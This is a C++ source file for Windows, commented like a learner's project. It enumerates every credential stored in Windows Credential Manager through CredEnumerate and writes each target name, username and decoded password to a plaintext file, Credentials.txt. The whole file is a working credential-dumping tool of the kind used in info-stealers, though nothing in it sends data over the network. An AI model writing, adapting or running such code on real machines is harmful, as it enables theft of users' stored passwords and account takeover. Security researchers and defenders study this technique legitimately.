#include <iostream>
#include <fstream>
#include <windows.h>    // windows API, must come before <wincred.h>

// this library is the windows cred API, it can be used for fetching from windows credential manager
#include <wincred.h>
// links a library which is required for windows credential management and for functions like cred and enumerate 
#pragma comment(lib, "advapi32.lib");


using namespace std;

void saveCredentials();

// void writeToFile(const string &filename, const string &content);


int main() {

    // writeToFile("Data.txt", "-----");

    saveCredentials();


    return 0;
}

void saveCredentials() {

    ofstream outfile("Credentials.txt");
    if(!outfile.is_open()) {
        cerr << "[-] Failed to open file for writing. \n";

    }

    // DWORD is a 32bit assigned int, it is from the winAPI
    DWORD count;
    // declares a pointer to an array of credential structures
    PCREDENTIAL * credentials;      

    // references count and credentials to work with original value if there is a lot of data. Prevents overloading of the program
    if(CredEnumerate(NULL, 0, &count, &credentials)) {      // NULL means all cred will be captured, 0 is reserved space. This will retreive credentials
        cout << "[+] Found " << count << " stored credentials. \n ";

        // iterating through the retrieved array
        for (DWORD i = 0; i < count; i++) {
            outfile << "Target: " << credentials[i] -> TargetName << "\n";

            // getting username
            if(credentials[i] -> UserName) {
                outfile << "Username: " << credentials[i] -> UserName << "\n";
            }

            // represents password in windows api, it is greater than 0 because if there is nothing then we dont need it
            if(credentials[i] -> CredentialBlobSize > 0) {
                string password((char*)credentials[i] -> CredentialBlob, credentials[i]->CredentialBlobSize);
                outfile << "Password: " << password << endl;    
            }
            outfile << "-----------------------------\n";
        }

         // prevents memory leaks  
        CredFree(credentials);    
    }
    else {
        cerr << "[-] Failed to enumerate credentials." << GetLastError() << "\n";
    }


}

// // function for file handling 
// void writeToFile(const string &filename, const string &content) {      // using links "&"" to make sure we are using original value and not copying large data
    
//     ofstream outfile(filename);
    
//     if(!outfile.is_open()) {
//         cerr << "[-] Failed to open file for writing.\n";
      
//     }

//     outfile << content;
//     outfile.close(); 
//     cout << "[+] Data written to file successfully" << filename << "\n";
// } 